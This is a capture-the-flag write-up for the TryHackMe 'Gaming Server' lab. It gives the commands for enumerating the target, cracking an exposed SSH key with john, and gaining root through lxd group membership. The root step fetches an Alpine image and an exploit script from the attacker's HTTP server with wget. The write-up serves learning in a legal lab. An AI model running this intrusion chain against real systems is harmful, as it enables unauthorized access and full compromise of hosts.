Tryhackme - Gaming server

Writeup:
*Enumeration:*

I began with a simple nmap scan for port discovery and services running in the respective ports

export IP={MACHINE_IP}
nmap -sVC -n -Pn -p- $IP --min-rate 5000

After the scan i decided to do an ffuf for directory enumeration

ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://$IP/FUZZ -maxtime 50

I checked out the /uploads/ folder and the /secret/ folder as they seemed juicy😋😋

The uploads folder gave me a dictionary file 'dict.lst' which contained a list of passwords.
The secret folder was an ssh private key RSA encrypted called 'secretkey'

As well doing a Ctrl+U displayed a comment which seemingly is a potential username. We'll see😂

// john, please add some actual content to the site! lorem ipsum is horrible to look at. //

*Decrypting the ssh key:*

First i converted the ssh key usig ssh2john

$/opt/JohnTheRipper/run/ssh2john secretkey > id_rsa.key

Then i conducted a bruteforce with join together with the wordlist found in the uploads folder

$john --wordlists=dict.lst id_rsa.key

Once we get the password, we can ssh into the machine
Note; Dont forget to run chmod 600 on the ssh key for you to use the key with ssh(Ensures only the owner has full read and write access)

$ssh -i secretkey john@$IP

*Privilege Escalation:*

Once i got into the machine, i did privilege escalation enumeration, ran linpeas but there was nothing much from that. But something caught my eyes, hear this☺️
Linpease gave a list of user id,s and i saw user was in lxd group. This is interesting..huuhh!!
Running id on the machine gave the same results as well

Doing a little digging and researching about lxd, i found out lxd is a linux container manager, and can be used to mount the root folder on the host machine
You can go through this https://www.hackingarticles.in/lxd-privilege-escalation/ which guides you.

On your own machine run lxd-alpine-builder to make a small alpine linux container

$git clone https://github.com/saghul/lxd-alpine-builder.git

cd into the cloned directory and run the bild-alpine file, and it will generate a tar.gz file that contains the linux container.

So I needed to deliver and run this file on the victim machine so i created a http server on my host machine

python -m http.server 8000

wget MACHINE_IP:8000/file.tar.gz  (this on the victim machine)

Doing further research on exploit_db i found a lxd privilege escalation script whih as well downloaded from the host via the http server.

I made the bash scrip executable and ran it.

./lxd_privesc.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz

This escalated our privileges and as well mounted the root directory to our lxd container.
So finally you can change directory to the root directory of the machine and read the flags.

Happy hacking!!🥳🥳
